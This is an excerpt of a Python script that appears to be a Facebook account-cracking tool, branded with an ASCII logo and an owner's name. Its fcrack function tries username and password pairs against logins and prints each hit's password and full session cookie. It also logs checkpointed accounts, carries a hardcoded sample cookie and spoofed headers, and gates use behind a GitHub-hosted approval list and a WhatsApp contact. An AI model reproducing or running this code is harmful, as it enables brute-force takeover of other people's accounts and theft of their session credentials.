...
logo = """
\33[1;32m  .d88b.  d8888b. d8888b.  .d88b.       d88888b .d888b. 
\33[1;32m  8P  Y8. 88  `8D 88  `8D .8P  Y8.      88'     88' `8D 
\33[1;32m 88    88 88oodD' 88oodD' 88    88      88ooo   `V8o88' 
\33[1;32m 88    88 88~~~   88~~~   88    88      88~~~      d8'  
\33[1;32m `8b  d8' 88      88      `8b  d8'      88        d8'   
\33[1;32m `Y88P'   88      88       `Y88P'       YP       d8' \033[1;37m 
--------------------------------------------------
[•] OWNER      : AHMED BALOCH 
[•] GITHUB     : TV AHMDOO
[•] STATUS     : FREE
[•] VERSION    : 1.3\033[1;37m
--------------------------------------------------
...
cps = []
try:
    print('\n\033[1;37m[•] WAIT SOMETIMES CHECKING FOR APPROVAL')
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=BTAKZtoaBZ-V9Dmfsk1DUgi2; sb=BTAKZmWLWW5z6DN3JyIFLmqB; m_pixel_ratio=3; wd=891x1604; ps_l=0; ps_n=0; fr=0LBU5iKOG7hCmXyIZ..BmCjAF..AAA.0.0.BmCjAa.AWXXmcqdCxw',
    'dpr': '3',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR AHMED-OK🥰] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍪]\033[0;93m COOKIE = \033[1;37m'+coki+  '  ''  \033[1;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
               # print('\033[1;33m[MR AHMED-CP☹️] '+cid+' | '+ps+'\x1b[1;97m')
            #    open('MR AHMED-CP.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mAHMED ⚓\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Aayush67890/daivai/blob/main/Aaprobul.txt').text
    if id in httpCaht:
      ...
      tks = (''+id);os.system('am start https://wa.me/+33756496804?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
